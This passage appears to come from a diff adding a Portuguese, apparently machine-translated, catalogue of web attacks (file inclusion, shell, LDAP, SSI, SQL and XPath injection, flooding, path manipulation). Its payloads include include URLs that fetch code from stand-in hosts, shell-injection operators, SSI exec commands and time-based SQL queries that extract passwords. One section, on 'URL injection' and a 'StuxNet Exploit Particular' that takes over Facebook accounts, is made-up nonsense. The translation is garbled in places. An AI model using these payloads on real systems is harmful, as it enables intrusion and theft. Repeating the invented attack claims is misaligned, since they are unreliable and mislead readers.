+      <option value="blue">blue</option>
+   </select>
+   <input type="submit">
+</form>
+
+
+
+O desenvolvedor pensou que isso iria garantir que apenas blue.php e red.php pôde ser carregado. Mas, como qualquer pessoa pode facilmente inserir valores arbitrários na cor, é possível injetar um código de arquivos:
+
+- /vulnerable.php?COLOR = http://evil/exploit - injeta um arquivo hospedado remotamente contendo um exploit.
+- /vulnerable.php?COLOR = C:\ftp\de upload\explorar - injeta um arquivo enviado contém um exploit.
+- /vulnerable.php?COLOR = .. \..\..\..\ftp\de upload\explorar - injeta um arquivo enviado contém um exploit, usando Path Traversal.
+- / vulnerable.php?COLOR = C:\ notes.txt% 00 - exemplo de uso de caracteres Null, caráter Meta para remover o sufixo php, permitindo o acesso a outros arquivos de php... (PHP configuração "magic_quotes_gpc = On", que é padrão, iria parar este ataque)
+
+Exemplo 4 ~
+A URL simples que demonstra uma maneira de fazer esse ataque:
+
+
+http://some-page/any-dir/index.php?page=<?include($s);?>&s=http://malicious-page/cmd.txt?  
+
+
+Exemplo 5 ~
+A injeção da Shell aplica-se à maioria dos sistemas de software que permitem a execução de programação de uma linha de comando. As fontes típicas de Shell Injection são chamadas de sistema (), StartProcess (), java.lang.Runtime.exec () e APIs similar.
+Considere o seguinte programa PHP curto, que executa um programa externo chamado funnytext para substituir uma palavra que o usuário enviado com alguma outra palavra.
+
+
+<HTML>
+<?php
+passthru ( " /home/user/phpguru/funnytext " 
+           . $_GET['USER_INPUT'] );
+?>
+
+
+Este programa pode ser injetado de várias maneiras:
+`command` vai executar o comando.
+$ (commnd) irá executar o comando.
+, command irá executar o comando, eo resultado de comando de saída.
+| command irá executar o comando, eo resultado de comando de saída.
+&& command vai executar o comando, eo resultado de comando de saída.
+|| command irá executar o comando, eo resultado de comando de saída.
+> / Home / user / phpguru / .bashrc irá substituir o arquivo. Bashrc.
+</ Home / user / phpguru / .bashrc irá enviar arquivo. Bashrc como entrada para funnytext.
+PHP oferece escapeshellarg () e escapeshellcmd () para executar a codificação antes de chamar os métodos. No entanto, não é recomendável confiar nesses métodos para ser seguro - também validar / higienizar entrada.
+
+Exemplo 6 ~
+O código a seguir é vulnerável a injeção de eval (), porque não limpar a entrada do usuário (neste caso: "username"). O programa só salva esta entrada em um arquivo txt, e, em seguida, o servidor irá executar esse arquivo, sem qualquer validação. Neste caso, o utilizador é capaz de introduzir um comando, em vez de um nome de utilizador.
+Exemplo:
+
+
+<%
+	If not isEmpty(Request( "username" ) ) Then
+		Const ForReading = 1, ForWriting = 2, ForAppending = 8
+		Dim fso, f
+		Set fso = CreateObject("Scripting.FileSystemObject")
+		Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
+		f.Write Request("username") & vbCrLf
+		f.close
+		Set f = nothing
+		Set fso = Nothing
+		%>
+		<h1>List of logged users:</h1>
+		<pre>
+		<%
+			Server.Execute( "userlog.txt" )
+		%>
+		</pre>
+		<%
+	Else
+		%>
+		<form>
+			<input name="username" /><input type="submit" name="submit" />
+		</form>
+		<%
+	End If
+%>
+
+
+Um pouco similar à Code Injection (Injeção de Código).
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção LDAP
+
+Descrição
+
+Injeção de LDAP é um ataque usado para explorar aplicações baseadas na web que constroem declarações LDAP com base na entrada do usuário. Quando um aplicativo não consegue higienizar corretamente a entrada do usuário, é possível modificar as declarações LDAP usando um proxy local. Isso poderia resultar na execução de comandos arbitrários, como a concessão de permissões para consultas não autorizadas, e modificação do conteúdo dentro da árvore LDAP. As mesmas técnicas de exploração avançados disponíveis no SQL Injection pode ser igualmente aplicada em injeção LDAP.
+
+Exemplos
+
+Exemplo 1 ~
+Em uma página com um formulário de pesquisa do usuário, o seguinte código é responsável por pegar o valor de entrada e gerar uma consulta LDAP que será utilizado no banco de dados LDAP.
+
+
+ <input type="text" size=20 name="userName">Insert the username</input> 
+
+
+Se a variável $ nome não é validada, que pode ser possível realizar a injecção LDAP, como se segue:
+* Se um usuário coloca "*" na caixa de pesquisa, o sistema pode retornar todos os nomes de usuários na base LDAP
+* Se um usuário coloca "Jonys) (| (senha = *))", ele irá gerar o código abaixo revelando a senha 'Jonys (cn = Jonys) (| (senha = *))
+
+Exemplo 2 ~
+O seguinte código vulnerável é usado em uma aplicação web ASP que fornece entrar com um banco de dados LDAP. Na linha 11, o nome da variável é inicializada e validados para verificar se ele não está em branco. Em seguida, o conteúdo dessa variável é usada para construir uma consulta LDAP usado por SearchFilter na linha 28. O atacante tem a chance de especificar o que será consultado no servidor LDAP, e ver o resultado na linha 33-41; todos os resultados e seus atributos são exibidos.
+Comentou código asp vulnerável:
+
+
+
+ 1.	<html>
+ 2.	<body>
+ 3.	<%@ Language=VBScript %>
+ 4.	<%
+ 5.	Dim userName
+ 6.	Dim filter
+ 7.	Dim ldapObj
+ 8.		
+ 9.	Const LDAP_SERVER = "ldap.example"
+ 10.	
+ 11.	userName = Request.QueryString("user")
+ 12.	
+ 13.	if( userName = "" ) then
+ 14.	Response.Write("Invalid request. Please specify a valid
+ 15.	user name")
+ 16.	Response.End()
+ 17.	end if
+ 18.	
+ 19.	filter = "(uid=" + CStr(userName) + ")" ' searching for the  user entry 
+ 20.	
+ 21.	'Creating the LDAP object and setting the base dn
+ 22.	Set ldapObj = Server.CreateObject("IPWorksASP.LDAP")
+ 23.	ldapObj.ServerName = LDAP_SERVER
+ 24.	ldapObj.DN = "ou=people,dc=spilab,dc=com"
+ 25.	
+ 26.	'Setting the search filter
+ 27.	ldapObj.SearchFilter = filter
+ 28.	
+ 29.	ldapObj.Search
+ 30.	
+ 31.	'Showing the user information
+ 32.	While ldapObj.NextResult = 1
+ 33.	Response.Write("<p>")
+ 34.	
+ 35.	Response.Write("<b><u>User information for: " + 
+ 36.	ldapObj.AttrValue(0) + "</u></b><br>")
+ 37.	For i = 0 To ldapObj.AttrCount -1
+ 38.	Response.Write("<b>" + ldapObj.AttrType(i) +"</b>: " +
+ 39.	ldapObj.AttrValue(i) + "<br>" )
+ 40.	Next
+ 41.	Response.Write("</p>")
+ 42.	Wend
+ 43.	%>
+ 44.	</body>
+ 45.	</html>   
+
+
+
+No exemplo acima, enviar o caractere * no parâmetros do utilizador que irá resultar na variável de filtro no código para ser inicializado com (uid = *). A declaração LDAP resultante fará com que o servidor retornar qualquer objeto que contém um atributo uid como nome de usuário.
+
+
+http://www.some-site.org/index.asp?user=*  
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção URL ou Hacking Extremo Invasionário ou Injeção Operacional Sistemática
+
+Descrição
+
+A Injeção URL consiste em clonar o IP de uma máquina de uma espécie reservada, para que a mesma possa enganar servidores, sites e perseguidores. De um modo mais resumido, a injeção de URL não serve para se injetar em sites ou sistemas remotos, e sim em sua própria máquina vazendo assim que ela adquira características especiais.
+
+
+Exemplos
+
+Reflexão Operacional ~
+Depois de sua máquina ter sido autora de uma injeção de URL nela mesma, ela pode personificar uma outra máquina, os Hackers criadores da técnica (UnknownSec & AndrewSec) usam esse tipo de ataque, também como forma de defesa contra Crackers usando a Reflexão Operacional que clona exatamente e perfeitamente as características da máquina do Cracker perseguidor, para que quando ele caçe um deles em objetivo de seus IPS, vão estar se deparando com o próprio endereço IP, dependendo da vontade do Cracker de alcançar seu objetivo pode ser que ele sem prestar a atenção ataque seu próprio computador.
+
+Injeção de URL ~
+Uma técnica do mesmo tipo de ataque que tem o mesmo objetivo que SQL Injection, o objetivo de penetrar em um site como usuário administrador, porém um ataque não tem nada a ver com outro. O método de Injeção de URL consiste em fazer com que todos os requisitos necessários para a invasão de um servidor, site, painel e etc, seja quitada, ou seja burlada. Com uma sequência complexa e avançada de códigos e comandos no Terminal, é possível que o atacante quite (burle) a requisição de usuário e senha de um site para que o atacante possa logar como administrador sem ter nem mesmo que saber o nome de login de uma conta administradora.
+
+StuxNet Exploit Particular ~
+A StuxNet Exploit Particular também faz parte do conjunto de métodos do ataque URLi (ou HEI, ou IOS). Esse método de ataque consiste em um arquivo extenso que varia de tamanho dependendo da utilização e criação do mesmo, ele serve para monitorar algo ou alguém, como ações de contas em bancos, redes sociais, jogos, e tudo mais que infrinja conexão direta ou indireta com um sistema vivo de conexões simultâneas. Ele funciona de um modo bem simples, você programa o arquivo de acordo com sua necessidade e acopla a um sistema fácilmente apenas compartilhando-o, exemplo: se quer monitorar as ações de uma conta no Facebook sem que tenha que logar ou se autenticar nela, apenas envie um arquivo (não é necessário que a vítima aceite-o) a ela por mensagem, e pronto, uma conexão direta entre o arquivo StuxNet Private Exploit (de ligação com seu computador) e o respectivo perfil da vítima no Facebook, habilitando assim para que você veja as notificações, mensagens, posts e tudo mais da conta da vítima.
+
+
+Notas:
+
+- Ataque criado por UnknownSec & AndrewSec, como a Botnet de Knock.
+- As técnicas de ataques criadas por UnknownSec e AndrewSec (como exemplos da BNK e da IOS) são única e exclusivamente usadas por eles mesmos, não são públicas ou compartilhadas (que todos podem ter acesso e aprender à fazer)
+- Não ensinaremos nada sobre a técnica privada deles, estes artigos são somente para exposição de conteúdo explicando o que faz cada ataque criado por eles.
+- Não existe por enquanto nenhum tipo de exploit, sniffer ou scanner para rastreamento e/ou execução deste tipo de ataque, é um ataque completamente manual e complexo.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção Server-Side Includes
+
+Descrição
+
+SSIs são diretrizes presentes em aplicações Web usadas​para alimentar uma página HTML com conteúdos dinâmicos. Eles são semelhantes aos CGIs, exceto que SSIs são usados​para executar algumas ações antes da página atual ser carregada ou enquanto a página está sendo visualizada. A fim de fazer isso, o servidor web analisa SSI antes de fornecer a página para o usuário.
+A Server-Side Inclui ataque permite a exploração de uma aplicação web, injetando os scripts em páginas HTML ou executar códigos arbitrários remotamente. Ele pode ser explorado através da manipulação de SSI em uso no aplicativo ou forçar o seu uso através de campos de entrada do usuário.
+
+
+< ! # = / . " - > and [a-zA-Z0-9] 
+
+
+Outra forma de descobrir se o aplicativo é vulnerável é verificar a presença de páginas com extensão .STM, .Shtm e .Shtml. No entanto, a falta deste tipo de páginas não significa que o aplicativo está protegido contra ataques de SSI.
+Em qualquer caso, o ataque será bem sucedido apenas se o servidor web permitir a execução SSI sem validação adequada. Isso pode levar ao acesso e manipulação de sistema de arquivos e processos sob a permissão do proprietário do processo do servidor web.
+O atacante pode acessar informações confidenciais, tais como arquivos de senhas, e executar comandos shell. As diretivas SSI são injetadas em campos de entrada e elas são enviados para o servidor web. O servidor web analisa e executa as directivas antes de fornecer a página. Então, o resultado do ataque será visível na próxima vez que a página é carregada para o navegador do usuário.
+
+Exemplos
+
+Exemplo 1 ~
+Os comandos utilizados para injectar SSI varia de acordo com o sistema operacional de servidor em uso. Os comandos a seguir representam a sintaxe que deve ser usado para executar comandos do sistema operacional.
+
+Linux:
+Lista de arquivos do diretório:
+
+
+< !--#exec cmd="ls" -->
+
+
+Acesso de diretórios:
+
+Windows:
+Lista de arquivos do diretório:
+
+
+< !--#exec cmd="dir" -->
+
+
+Diretórios de acesso:
+
+< !--#exec cmd="cd C:\admin\dir">
+
+
+Exemplo 2 ~
+Outros exemplos SSI que podem ser usados​para acessar e configurar as informações do servidor:
+Para alterar a saída de mensagem de erro:
+
+<!--#config errmsg="File not found, informs users and password"-->
+
+
+Para mostrar o atual nome de arquivo do documento:
+
+<!--#echo var="DOCUMENT_NAME" -->
+
+Para mostrar o nome do arquivo de diretório virtual:
+
+<!--#echo var="DOCUMENT_URI" -->
+
+Usando o comando "config" e o parâmetro "timefmt", é possível controlar o formato da data e hora de saída:
+
+<!--#config timefmt="A %B %d %Y %r"-->
+
+Usando o comando "fsize", é possível imprimir o tamanho do ficheiro seleccionado:
+
+<!--#fsize file="ssi.shtml" -->
+
+
+Exemplo 3 ~
+Uma velha vulnerabilidade no IIS versões 4.0 e 5.0 permite que um atacante obtenha privilégios de sistema através de uma falha de buffer overflow em uma biblioteca de vínculo dinâmico (ssinc.dll). O "ssinc.dll" é usado para processo intérprete Server-Side Includes. CVE 2001-0506.
+Ao criar uma página contendo o código malicioso SSI abaixo e forçando a aplicação para carregar esta página (Path Traversal ataque), é possível realizar esse ataque:
+ssi_over.shtml
+
+
+<!--#include file=”UUUUUUUU...UU”-->
+
+
+PS: O número de "U" deve ser mais longo do que 2049.
+Forçar a aplicação para carregar a página ssi_over.shtml:
+URL não-maliciosa:
+
+
+www.vulnerablesite.org/index.asp?page=news.asp
+
+
+URL maliciosa:
+
+www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml
+
+
+Se o IIS retorna uma página em branco que indica que ocorreu um estouro. Neste caso, o atacante pode manipular o fluxo de processo e executa um código arbitrário.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção de SQL Cega
+
+Descrição
+
+Injeção de SQL Cega (Linguagem de Consulta Estruturada) é um tipo de ataque de injeção SQL que pede aos bancos de dados verdadeiras ou falsas questões e determina a resposta com base na resposta das aplicações. Este ataque é muitas vezes usado quando a aplicação web está configurada para exibir mensagens de erro genéricas, mas não mitigou o código que é vulnerável a injeção de SQL.
+Quando um invasor explora uma injeção de SQL, por vezes, a aplicação web exibe mensagens de erro do banco de dados se queixando de que a sintaxe da consulta SQL está incorreto. Injeção de SQL Cega é quase idêntica à Injeção de SQL normal, sendo a única diferença a maneira como os dados são recuperados a partir da base de dados. Quando o banco de dados não tem dados de saída para a página web, um atacante é forçado a roubar dados, fazendo o banco de dados de uma série de perguntas de verdadeiro ou falso. Isso faz com que a exploração da vulnerabilidade de SQL seja mais difícil, mas não impossível..
+
+Exemplos:
+
+Um atacante pode verificar se um pedido enviado retorna verdadeiro ou falso de algumas maneiras:
+
+Baseada em conteúdo ~
+Usando uma página simples, que exibe um artigo com determinado ID como parâmetro, o atacante pode realizar alguns testes simples para determinar se a página é vulnerável a ataques de SQL Injection.
+Exemplo de URL:
+http://newspaper.com/items.php?id=2
+Envia a seguinte consulta ao banco de dados:
+
+SELECT title, description, body FROM items WHERE ID = 2
+
+O atacante pode então tentar injetar uma consulta que retorna 'false':
+http://newspaper.com/items.php?id=2 and 1=2
+Agora, a consulta SQL deve se parece com isso:
+
+SELECT title, description, body FROM items WHERE ID = 2 and 1=2
+
+Se a aplicação web é vulnerável à SQL Injection, então ela provavelmente não vai retornar nada. Para se certificar, o atacante vai injectar uma consulta que irá retornar 'true':
+http://newspaper.com/items.php?id=2 and 1=1
+Se o conteúdo da página que retorna "verdadeira" é diferente do que a da página que retorna "falso", o atacante vai ser capaz de distinguir, quando a consulta executada devolve verdadeiro ou falso.
+Uma vez que isso foi verificado, as únicas limitações são privilégios criados pelo administrador do banco de dados, diferente sintaxe SQL, e a imaginação do invasor.
+
+Baseado no tempo ~
+Este tipo de Injeção de SQL Cega confia no banco de dados parando por um período de tempo especificado, em seguida, retorna os resultados, indicando a execução de uma consulta SQL bem sucedida. Usando este método, um atacante enumera cada letra do pedaço desejado de dados usando a seguinte lógica:
+Se a primeira letra do nome do primeiro banco de dados é um 'A', aguarde 10 segundos.
+Se a primeira letra do nome do primeiro banco de dados é um 'B', aguarde 10 segundos. etc
+
+Microsoft SQL Server
+http://www.site.com/vulnerable.php?id=1' waitfor delay '00:00:10'--
+
+MySQL
+SELECT IF(expression, true, false)
+
+Usando uma operação de tomada de tempo, por exemplo, BENCHMARK (), vai atrasar as respostas do servidor se a expressão for True.
+
+BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))
+
+- Irá executar a função ENCODE 5000000 vezes.
+Dependendo do desempenho e da carga do servidor de banco de dados, ele deve ter apenas um momento para concluir esta operação. O importante é, do ponto de vista do atacante, para especificar um número alto o suficiente do índice de referência () das funções de repetições afetar o tempo de resposta do banco de dados de uma forma perceptível.
+Exemplo de combinação de ambas as consultas:
+
+1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
+
+Se a resposta do banco de dados levou muito tempo, podemos esperar que o primeiro caractere de senha de usuário com user_id = 1 é o caráter '2 '.
+
+(CHAR(50) == '2')
+
+Usando este método para o resto de caracteres, é possível enumerar senhas inteiras armazenados no banco de dados. Este método funciona mesmo quando o atacante injeta as consultas SQL eo conteúdo da página vulnerável não muda.
+É óbvio que, neste exemplo, os nomes das tabelas e o número de colunas foi especificado. No entanto, é possível adivinhar-los ou verificar com um método de tentativa e erro.
+Outras bases de dados de MySQL também têm funções baseadas no tempo que lhes permitam ser usado para ataques baseados no tempo:
+* MS SQL 'WAIT FOR DELAY '0:0:10 [*MS SQL 'PARA O ATRASO' 0:00:10]
+* PostgreSQL - pg_sleep()
+
+A realização ataques Injeção de SQL Cega manualmente é muito demorado, mas há uma série de ferramentas que automatizam este processo. Um deles é o SqlMap (http://sqlmap.sourceforge.net/). Por outro lado, as ferramentas deste tipo são muito sensíveis a pequenos desvios da regra. Isto inclui:
+* Digitalização de outros clusters no site, onde os relógios não são perfeitamente sincronizados,
+* Serviços WWW, onde método adquirir argumento foi alterado, por exemplo, de / index.php? ID = 10 a / ID, 10
+
+Impressões Digitais do banco de dados remoto ~
+
+Se o atacante é capaz de determinar quando a sua consulta retorna True ou False, então ele pode ter a impressão digital do RDBMS. Isso fará com que todo o ataque seja muito mais fácil. Se for utilizada a abordagem baseada em tempo, isso ajuda a determinar o tipo de banco de dados está em uso. Outros métodos populares para fazer isso é chamar as funções que irá retornar a data atual. MySQL, MSSQL e Oracle têm funções diferentes para que, respectivamente now (), getdate (), e sysdate ().
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção XPATH
+
+Descrição
+
+Semelhante a Injeção SQL, ataques de injeção XPath ocorrem quando um site utiliza informações fornecidas pelo usuário para a construção de uma consulta XPath para dados XML. Através do envio de informações intencionalmente mal formado no site, um atacante pode descobrir como os dados XML são estruturados, ou dados de acesso que ele não pode normalmente ter acesso. Ele pode até mesmo ser capaz de elevar seus privilégios no site se os dados XML estão sendo usados para autenticação (como um arquivo de usuário baseada em XML).
+Consultando XML é feito com XPath, um tipo de declaração descritiva simples que permite a consulta XML para localizar um pedaço de informação. Como SQL, você pode especificar certos atributos para encontrar e padrões para combinar. Ao utilizar XML para um web site é comum aceitar alguma forma de entrada na string de consulta para identificar o conteúdo para localizar e exibir na página. Esta entrada deve ser higienizada para verificar se ela não atrapalha a consulta XPath e retorna os dados errados.
+XPath é uma linguagem padrão, a sua notação / sintaxe é sempre uma implementação independente, o que significa que o ataque pode ser automatizado. Não há dialetos diferentes, como ocorre em pedidos para o databeses SQL.
+Porque não há nenhum controle de acesso de nível é possível obter o documento inteiro. Nós não encontramos  quaisquer limitações quanto podemos saber a partir de ataques de injeção SQL.
+
+Exemplos
+
+Usaremos este trecho xml para os exemplos.
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<Employees>
+   <Employee ID="1">
+      <FirstName>Arnold</FirstName>
+      <LastName>Baker</LastName>
+      <UserName>ABaker</UserName>
+      <Password>SoSecret</Password>
+      <Type>Admin</Type>
+   </Employee>
+   <Employee ID="2">
+      <FirstName>Peter</FirstName>
+      <LastName>Pan</LastName>
+      <UserName>PPan</UserName>
+      <Password>NotTelling</Password>
+      <Type>User</Type>
+   </Employee>
+</Employees>
+
+
+Suponha que temos um sistema de autenticação de usuário em uma página web que usou um arquivo desse tipo de dados de login de usuários. Uma vez que um nome de usuário e senha foram fornecidos o software pode usar XPath para procurar o usuário:
+
+
+VB:
+Dim FindUserXPath as String
+FindUserXPath = "//Employee[UserName/text()='" & Request("Username") & "' And 
+        Password/text()='" & Request("Password") & "']"
+
+C#:
+String FindUserXPath;
+FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And 
+        Password/text()='" + Request("Password") + "']";
+
+
+Com um nome de usuário e senha normal, este XPath iria funcionar, mas um atacante pode enviar um mau nome de usuário e senha e obter um nó XML selecionado sem saber o nome de usuário ou senha, como esta:
+
+
+Username: blah' or 1=1 or 'a'='a
+Password: blah
+
+FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 
+        'a'='a' And Password/text()='blah']
+
+Logically this is equivalent to:
+        //Employee[(UserName/text()='blah' or 1=1) or 
+        ('a'='a' And Password/text()='blah')]
+
+
+Neste caso, apenas a primeira parte do XPath deve ser verdadeira. A parte senha torna-se irrelevante, e a parte UserName irá corresponder a todos os funcionários por causa da parte "1 = 1".
+Assim como injeção de SQL, a fim de se proteger você deve escapar aspas simples (ou aspas), se o seu aplicativo usa-los.
+
+
+VB:
+Dim FindUserXPath as String
+FindUserXPath = "//Employee[UserName/text()='" & Request("Username").Replace("'", "'") & "' And 
+        Password/text()='" & Request("Password").Replace("'", "'") & "']"
+
+C#:
+String FindUserXPath;
+FindUserXPath = "//Employee[UserName/text()='" + Request("Username").Replace("'", "'") + "' And 
+        Password/text()='" + Request("Password").Replace("'", "'") + "']";
+
+
+Outro melhor opção de mitigação é usar um XPath pré-compilado. XPaths pré-compilados já estão pré-definidos antes de o programa é executado, ao invés de criado na mosca após a entrada do usuário foi adicionado à string. Esta é uma rota melhor, porque você não tem que se preocupar em perder um personagem que deveria ter sido escapado.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Injeção XPath Cega
+
+Descrição
+
+XPath é um tipo de linguagem de consulta que descreve como localizar elementos específicos (incluindo atributos, instruções de processamento, etc) em um documento XML. Uma vez que é uma linguagem de consulta, XPath é um pouco semelhante a Structured Query Language (SQL). No entanto, XPath pode ser usado para fazer referência a quase qualquer parte de qualquer documento XML, sem restrições de controle de acesso, enquanto que com SQL, um "usuário" (que é um termo indefinido no contexto XPath / XML) pode ser restringida a determinadas tabelas, colunas ou queries.
+Mais informação pode ser encontrada no artigo dedicado ao Injeção XPath. Usando um ataque de injeção XPath o atacante é capaz de efetuar login no sistema, sem entrar com login e senha válidos. Se ele quer saber informações sobre outros usuários, ele deve dar um passo adiante. Ao realizar um ataque de Injeção XPath Cega, o atacante não tem conhecimento sobre a estrutura do documento XML. No entanto, sua situação é melhor em comparação com a Injeção de SQL Cega, porque há funções que permitem a realização de testes (XML Crawling) e no fim de conhecer a estrutura do documento.
+
+Exemplos
+
+O atacante pode ser bem sucedido usando dois métodos: Boolenização e Indexação XML. Ao adicionar a sintaxe XPath, o atacante usa expressões adicionais (substituindo o que o atacante entrou no lugar de login para a expressão especialmente criado).
+
+Boolenization ~
+
+Utilizando o método de "Boolenização" o atacante pode descobrir se uma determinada expressão XPath é verdadeira ou falsa. Vamos supor que o objetivo do atacante é fazer login na conta. Log de​sucesso se igualaria "True" e não log em tentativa seria igual "Falso". Apenas uma parte inteligente da informação é analisada "caráter" ou o número. Quando o atacante se concentra na cadeia ele pode revelá-lo em sua totalidade, verificando cada personagem dentro da classe / série de personagens que nesta string pertence.
+Usando uma função string-length (S), onde S é uma string, o atacante pode descobrir o comprimento desta corda. Com o número apropriado de substring (S, N, 1) interações de funções, onde S é uma string mencionado anteriormente, N é um carácter de início, e "1" é o próximo personagem a contar da personagem N, o atacante é capaz de descobrir a corda toda.
+Código:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<data>
+   <user>
+   <login>admin</login>
+   <password>test</password>
+   <realname>SuperUser</realname>
+   </user>
+   <user>
+   <login>rezos</login>
+   <password>rezos123</password>
+   <realname>Simple User</realname>
+   </user>
+</data>
+
+Função:
+1 - string.stringlength (/ / user [position () = 1] / child :: node () [position () = 2]) retorna o comprimento da segunda seqüência do primeiro usuário (8),
+2 - substring ((/ / user [position () = 1] / child :: node () [position () = 2), 1,1) retorna o primeiro caractere deste usuário ('r').
+
+Indexação XML ~
+
+Para conhecer a estrutura do documento XML o atacante pode usar:
+* Count (expressão)
+
+count(//user/child::node()
+
+Isto fará voltar o número de nós (neste caso 2).
+* StringLength (string)
+
+string-length(//user[position()=1]/child::node()[position()=2])=6
+
+Usando esta consulta o atacante vai descobrir se a segunda string (senha) do primeiro nó (o usuário 'admin') consiste de seis caracteres.
+* Substring (string, número, número)
+
+substring((//user[position()=1]/child::node()[position()=2]),1,1)="a"
+
+Esta consulta irá confirmar (True) ou negar (False) que o primeiro caractere do usuário ('admin') password é um personagem "a".
+
+Se o registro no formulário ficaria assim:
+C #:
+
+String FindUser;
+FindUser = "//user[login/text()='" + Request("Username") + "' And
+      password/text()='" + Request("Password") + "']";
+
+em seguida, o atacante deve injetar o seguinte código:
+
+Username: ' or substring((//user[position()=1]/child::node()[position()=2]),1,1)="a" or ''='
+
+A sintaxe XPath pode lembrá-lo de ataques de injeção de SQL comuns, mas o atacante deve-se considerar que este não permite que a linguagem comente  o resto da expressão. Para omitir essa limitação, o atacante deve usar ou expressões de anular todas as expressões, o que pode perturbar o ataque.
+Por causa da Boolenização no número de consultas, mesmo dentro de um documento XML pequeno, pode ser muito alta (milhares, centenas de milhares de pessoas ou mais). É por isso que este ataque não é realizada manualmente. Conhecendo algumas funções básicas XPath o atacante é capaz de escrever um aplicativo em um curto espaço de tempo, o que irá reconstruir a estrutura do documento e preenchê-lo com dados por si só.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Inundação de Tráfico
+
+Descrição
+
+Inundação de Tráfico é um tipo de ataque DoS com alvo em servidores web. O ataque explora a maneira que a conexão TCP é gerenciada. O ataque consiste na geração de um grande número de requisições TCP bem trabalhadas, com o objetivo de parar o servidor Web ou causar uma diminuição do desempenho.
+O ataque explora uma característica do protocolo HTTP, abrindo muitas conexões ao mesmo tempo para assistir a uma única requisição. Esta característica especial do protocolo http, que consiste em abrir uma conexão TCP para cada objeto html e fechá-lo, poderia ser usada para fazer dois tipos de explorações. O ataque conexão é feito durante o estabelecimento da conexão, e o ataque de Encerramento é feito durante o encerramento da conexão.
+
+Exemplos
+
+Ataque conexão ~
+Este tipo de ataque consiste em estabelecer um grande número de conexões TCP falsas com uma solicitação HTTP incompleta até que o servidor web esteja sobrecarregado com conexões e deixa de responder.
+O objectivo do pedido de HTTP incompleto é manter o servidor web, com a ligação TCP em estado estabelecido, esperando a conclusão do pedido, tal como mostrado na figura 1. Dependendo da implementação do servidor de web, a conexão permanece neste estado até que haja um tempo limite da conexão TCP ou do servidor web. Desta forma, é possível estabelecer um grande número de novas ligações antes de os primeiros começarem a timeout. Além disso, a taxa de geração de novas ligações cresce mais depressa do que os que expiram. Figura 1: https://www.owasp.org/images/b/b4/Trafficatual.jpg
+O ataque também poderia afetar um firewall que implementa um proxy como o controle de acesso como Checkpoint FW1.
+
+Ataque de Encerramento ~
+O ataque de Encerramento é feito durante as etapas finais de uma conexão TCP, explorando como alguns servidores web lidam com a finalização da conexão TCP, especialmente com o estado FIN_WAIT_1. O ataque, como explicado por Stanislav Shalunov ", vem em dois sabores:. Mbufs exaustão e processo de saturação"
+Ao fazer mbufs exaustão, se quer o processo em nível de usuário na outra extremidade para gravar os dados sem bloquear e fechar o descritor. O kernel terá que lidar com todos os dados, e o processo em nível de usuário será livre, para que mais solicitações possam ser enviadas para um lado e, eventualmente, consumir todos os mbufs ou toda a memória física, se mbufs são alocados dinamicamente.
+Ao fazer o processo de saturação, se quer processo em nível de usuário para bloquear ao tentar gravar dados. A arquitetura de muitos servidores HTTP permitirá que serve apenas de um certo número de conexões de cada vez. Quando este número de conexões é atingido, o servidor irá parar de responder a usuários legítimos. Se o servidor não colocar um limite no número de conexões, os recursos ainda vão ser amarrados e, eventualmente, a máquina chega a um rastreamento de impasse.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Manipulação de caminho
+
+Descrição
+
+Erros de manipulação de caminhos ocorrem quando forem satisfeitas as seguintes condições:
+1 - Um atacante pode especificar um caminho usado em uma operação no sistema de arquivos.
+2 - Ao especificar o recurso, o atacante ganha uma capacidade que não seriam permitidas. Por exemplo, o programa pode dar ao atacante a possibilidade de substituir o arquivo especificado ou correr com uma configuração controlada pelo atacante.
+Permitir a entrada do usuário para controlar os caminhos utilizados nas operações do sistema de arquivos pode permitir que um invasor acessar ou modificar recursos protegidos do sistema.
+
+Exemplos
+
+Exemplo 1 ~
+O código a seguir usa a entrada de uma solicitação HTTP para criar um nome de arquivo. O programador não considerou a possibilidade de que um invasor pode fornecer um nome de arquivo como ".. /.. / Tomcat / conf / server.xml", o que faz com que o aplicativo para excluir um de seus próprios arquivos de configuração.
+
+
+
+String rName = request.getParameter("reportName");
+	File rFile = new File("/usr/local/apfr/reports/" + rName);
+	...
+	rFile.delete();
+
+
+Exemplo 2 ~
+O código a seguir usa a entrada de um arquivo de configuração para determinar qual arquivo para abrir e ecoam de volta para o usuário. Se o programa é executado com privilégios e usuários mal-intencionados podem alterar o arquivo de configuração, eles podem usar o programa para ler qualquer arquivo no sistema que termina com a extensão .txt.
+
+
+fis = new FileInputStream(cfg.getProperty("sub")+".txt");
+	amt = fis.read(arr);
+	out.println(arr);
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Navegação Forçada
+
+Descrição
+
+Navegação forçada é um ataque onde o objectivo é enumerar e acessar recursos que não são referenciados pela aplicação, mas ainda são acessíveis.
+Um atacante pode usar técnicas de força bruta para procurar conteúdos desvinculados do diretório de domínio, tais como diretórios e arquivos temporários e arquivos de backup e configurações antigas. Esses recursos podem armazenar informações confidenciais sobre as aplicações web e sistemas operacionais, tais como o código-fonte, credenciais, rede interna de endereçamento, e assim por diante, sendo assim considerado um recurso valioso para os intrusos.
+Este ataque é realizado manualmente, quando os diretórios de índice de aplicações e páginas são baseados em geração de números ou valores previsíveis, ou o uso de ferramentas automatizadas para arquivos comuns e nomes de diretório.
+Este ataque também é conhecido como previsível Resource Location, Enumeration File, enumeração Directory, e enumeração de recursos.
+
+Exemplos
+
+Exemplo 1 ~
